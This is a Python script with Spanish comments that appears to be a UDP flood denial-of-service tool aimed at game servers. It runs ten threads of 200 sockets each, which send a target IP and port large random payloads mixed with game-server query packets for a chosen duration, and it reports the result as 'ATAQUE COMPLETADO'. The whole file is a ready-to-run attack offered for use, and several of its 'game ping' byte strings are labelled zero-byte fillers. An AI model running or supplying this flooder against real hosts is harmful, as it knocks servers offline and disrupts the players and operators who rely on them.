import socket
import random
import sys
import time
import threading

def udpping_game_flood(target_ip, target_port, duration):
    """UDP Unconnect ping para juegos + flood masivo - SIN ROOT"""
    
    # Múltiples sockets para más potencia
    sockets = []
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            sockets.append(sock)
        except:
            pass
    
    # Unconnect pings de juegos (reales)
    game_pings = [
        # Minecraft
        b'\xFE\xFD\x09\x00\x00\x00\x00',  # Unconnected ping
        b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        b'\xFE\xFD\x00\x00\x00\x00\x00',
        
        # Counter-Strike / Source
        b'\xFF\xFF\xFF\xFFTSource Engine Query\x00',
        b'\xFF\xFF\xFF\xFF\x69\x00\x00\x00',  # A2S_INFO
        b'\xFF\xFF\xFF\xFF\x55\x00\x00\x00',  # A2S_PLAYER
        
        # Steam
        b'\xFF\xFF\xFF\xFF\x69',
        b'\xFF\xFF\xFF\xFF\x55',
        
        # Call of Duty
        b'\xFF\xFF\xFF\xFFgetinfo\x00',
        b'\xFF\xFF\xFF\xFFgetstatus\x00',
        
        # Quake/Doom
        b'\xFF\xFF\xFF\xFFstatus\x00',
        b'\xFF\xFF\xFF\xFFinfo\x00',
        
        # Battlefield
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01',
        
        # Unreal Tournament
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        
        # Factorio
        b'\x00\x00\x00\x00\x00\x00\x00',
        
        # Terraria
        b'\x00\x00\x00\x00\x00\x00\x00\x00',
        
        # Rust
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        
        # ARK
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        
        # GTA Online
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        
        # Valorant
        b'\xFF\xFF\xFF\xFF\x69\x6E\x66\x6F\x00',
        
        # Apex Legends
        b'\xFF\xFF\xFF\xFFinfo\x00',
        
        # Palworld
        b'\x50\x41\x4C\x00\x00\x00\x00',
    ]
    
    # Flood masivo (datos grandes)
    flood_data = []
    for _ in range(20):
        flood_data.append(random._urandom(1450))  # Casi MTU
        flood_data.append(random._urandom(1400))
        flood_data.append(random._urandom(1350))
        flood_data.append(random._urandom(1300))
    
    timeout = time.time() + duration
    packet_count = 0
    ping_count = 0
    flood_count = 0
    
    print(f"[🎮] UDP GAME UNCONNECT PING + FLOOD")
    print(f"[🎯] Target: {target_ip}:{target_port}")
    print(f"[⏱️] Duration: {duration}s")
    print(f"[🔌] Sockets: {len(sockets)}")
    print(f"[⚡] Game pings: {len(game_pings)} | Flood size: {len(flood_data)}")
    
    while time.time() < timeout:
        try:
            for sock in sockets:
                # 70% flood masivo, 30% game pings
                for _ in range(random.randint(20, 50)):
                    if random.random() < 0.7:
                        # Flood masivo - datos grandes
                        payload = random.choice(flood_data)
                        sock.sendto(payload, (target_ip, target_port))
                        flood_count += 1
                    else:
                        # Game Unconnect ping
                        payload = random.choice(game_pings)
                        # Añadir datos extra al ping
                        if random.random() < 0.5:
                            payload += random._urandom(random.randint(50, 200))
                        sock.sendto(payload, (target_ip, target_port))
                        ping_count += 1
                    
                    packet_count += 1
            
            # Stats cada 50k paquetes
            if packet_count % 50000 == 0:
                print(f"\r[📊] Total: {packet_count:,} | Game pings: {ping_count:,} | Flood: {flood_count:,}", end="")
            
        except Exception as e:
            # Recrear sockets si fallan
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            sockets = []
            for _ in range(200):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    sockets.append(sock)
                except:
                    pass
    
    for sock in sockets:
        try:
            sock.close()
        except:
            pass
    
    print(f"\n\n[✅] ATAQUE COMPLETADO")
    print(f"[📊] Total paquetes: {packet_count:,}")
    print(f"[🎮] Game Unconnect pings: {ping_count:,}")
    print(f"[💥] Flood masivo: {flood_count:,}")

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 udpping.py <ip> <port> <time>")
        print("Example: python3 udpping.py 192.168.1.1 25565 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    threads = []
    for _ in range(10):  # 10 threads = máximo poder
        t = threading.Thread(target=udpping_game_flood, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        threads.append(t)
    
    time.sleep(duration)

if __name__ == "__main__":
    main()
